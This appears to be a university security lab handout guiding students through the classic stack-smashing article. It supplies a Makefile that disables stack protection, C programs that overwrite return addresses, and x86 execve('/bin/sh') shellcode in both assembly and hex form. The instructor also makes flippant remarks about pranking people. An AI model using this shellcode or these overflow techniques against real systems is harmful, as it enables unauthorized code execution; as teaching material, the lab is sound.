## Introduction

In this lab, you are going to attempt to work through the classic hacker
e-zine article, "Smashing the Stack for Fun and Profit" which is
available here:
<https://cs.maryvillecollege.edu/wiki/Smashing_the_Stack>

This material is just a tad out of date, and so we have to modify the
examples to make them work properly. I have provided you with code to
get you started in these changes, and then left the rest as an exercise
to you. The biggest thing is getting the payloads right, however, and
those are provided to you.

As we stated in class, you could use this new found ability to exploit
buggy code for good or evil. It is my sincere hope that you find the
middle ground and find some sort of general enjoyment out of this as
breaking software can be a lot of fun. Barring that, at least find
someone you can mess with. Pranks are fun too\!

## Makefile

One thing that has changed in the past 21 years is that gcc now
generates stack protectors. These can be fooled, but doing so is no easy
task\! So to make things easier, we want to compile without stack
protectors. We also want to compile without optimization (so we get
predictable assembly code), and finally we want to make sure the linker
marks our stack as executable. Remember that our goal is to set up easy
targets to knock down so we can learn the mechanics of buffer overflow
attacks. If you want to do this in the real world, it will require a bit
more work.

To help you with all the compiler options, I recommend using the
following general purpose makefile.

**File:** Makefile

``` makefile
CFLAGS=-g -fno-stack-protector -z execstack -m32 -O0

%.s: %.c
        gcc $(CFLAGS) -S $< -o $@
```

This will handle compilation of any file, as well as the production of
asm code. For instance, you can build example1 by executing:

` make example1`

You can get the assembly listing of example1 by executing:

` make example1.s`

## Read Along\!

So for the first bit of the lab, I want you to read and work along with
the article, which is included in this directory.

As you come to each example, type in the code that I have provided in
the wiki page. (You will probably want to keep both open and handy.) To
get the most benefit, type the code, don't copy and paste it. Also,
comparing it to the original article may reveal some things about how I
had to change things to make them work. These patterns are important to
last section of the lab.

## example1.c

**File:** example1.c

``` c
void function(int a, int b, int c) {
    char buffer1[5];
    char buffer2[10];
}

void main() {
    function(1,2,3);
}
```

## example2.c

**File:** example2.c

``` c
#include <string.h>

void function(char *str) {
    char buffer[16];

    strcpy(buffer,str);
}


void main() {
    char large_string[256];
    int i;

    for( i = 0; i<255; i++)
        large_string[i] = 'A';
    function(large_string);
}
```

## example3.c

**File:** example3.c

``` c
#include <string.h>
#include <stdio.h>

void function(int a, int b, int c) {
    char buffer1[5];
    char buffer2[10];
    int *ret;

    ret = (int*)(buffer1 + 13);
    (*ret) += 8;
}


void main() {
    int x;

    x = 0;
    function(1,2,3);
    x = 1;
    printf("%d\n", x);
}
```

## shellcode.c

**File:** shellcode.c

``` c
#include <stdio.h>

void main() {
    char *name[2];
    name[0] = "/bin/sh";
    name[1] = NULL;
    execve(name[0], name, NULL);
}
```

## shellcodeasm.c

**File:** shellcodeasm.c

``` c
void main() {
__asm__ __volatile__("jmp    . + 0x2c                 # 3 bytes\n"
                     "popl   %esi                     # 1 byte\n"
                     "movl   %esi,0x8(%esi)           # 3 bytes\n"
                     "movb   $0x0,0x7(%esi)           # 4 bytes\n"
                     "movl   $0x0,0xc(%esi)           # 7 bytes\n"
                     "movl   $0xb,%eax                # 5 bytes\n"
                     "movl   %esi,%ebx                # 2 bytes\n"
                     "leal   0x8(%esi),%ecx           # 3 bytes\n"
                     "leal   0xc(%esi),%edx           # 3 bytes\n"
                     "int    $0x80                    # 2 bytes\n"
                     "movl   $0x1, %eax               # 5 bytes\n"
                     "movl   $0x0, %ebx               # 5 bytes\n"
                     "int    $0x80                    # 2 bytes\n"
                     "call   . -0x2a                  # 5 bytes\n"
                     ".string \"/bin/sh\"             # 8 bytes\n");
}
```

## testsc.c

**File:** testsc.c

``` c
char shellcode[] =
    "\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00"
    "\x00\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c"
    "\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8"
    "\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x90\x5d\xc3";

void main() {
    int *ret;

    ret = (int *) &ret + 2;
    (*ret) = (int)shellcode;
}
```

## shellcodeasm2.c

**File:** shellcodeasm2.c

``` c
void main() {
__asm__ __volatile__(
        "jmp    . + 0x21                 # 2 bytes\n"
        "popl   %esi                     # 1 byte\n"
        "movl   %esi,0x8(%esi)           # 3 bytes\n"
        "xorl   %eax,%eax                # 2 bytes\n"
        "movb   %al,0x7(%esi)            # 3 bytes\n"
        "movb   %al,0xc(%esi)            # 3 bytes\n"
        "movb   $0xb,%al                 # 2 bytes\n"
        "movl   %esi,%ebx                # 2 bytes\n"
        "leal   0x8(%esi),%ecx           # 3 bytes\n"
        "leal   0xc(%esi),%edx           # 3 bytes\n"
        "int    $0x80                    # 2 bytes\n"
        "xorl   %ebx,%ebx                # 2 bytes\n"
        "movl   %ebx,%eax                # 2 bytes\n"
        "inc    %eax                     # 1 bytes\n"
        "int    $0x80                    # 2 bytes\n"
        "call   . - 0x1f                 # 5 bytes\n"
        ".string \"/bin/sh\"             # 8 bytes\n"
);
}
```

## testsc2.c

**File:** testsc2.c

``` c
char shellcode[] =
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x88\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";

void main() {
   int *ret;

   ret = (int *)&ret + 2;
   (*ret) = (int)shellcode;
}
```

## Your First Hacker Challenge

Ok, so I have supplied you with enough code for you to have all the big
changes needed to make this payload work. Here's the challenge to you as
you continue reading along with the article. You will need to enter and
modify the examples that come from the article so that they work. A lot
of this will simply be modifying payloads and byte counts, but some of
it can get into some deep stuff.

You only need to get just one more of them to work, but you will win
respect (and 5 additional points) if you make the examples from the rest
of the article operational. Some of the software that it recommends
exploring is not available on our server, but otherwise you can make
these exploits work on our system.

If you do them all, you will also have a handy little buffer overrun
tool that you can use. I still have my version from 1996 and a
much-improved version that I have now. It is invaluable for security
testing and for general cyberpranking.

## Further Reading

If you enjoyed this lab, why not check out some of the sources I
"irresponsibly" referenced in the wiki page with the article? Even
better, why not find some others. (For instance, the hak5 youtube
channel or website <http://hak5.org>).

Messing around with deep low level stuff can be a lot of fun. It's only
illegal if you do it to someone else's system without their permission.
Doing this stuff will make you a stronger programmer, and during the
coming apocalypse, it will help you become a formidable opponent to
those who would do you harm.

Ok, so maybe it will just make you a stronger coder, but a man can
dream\!
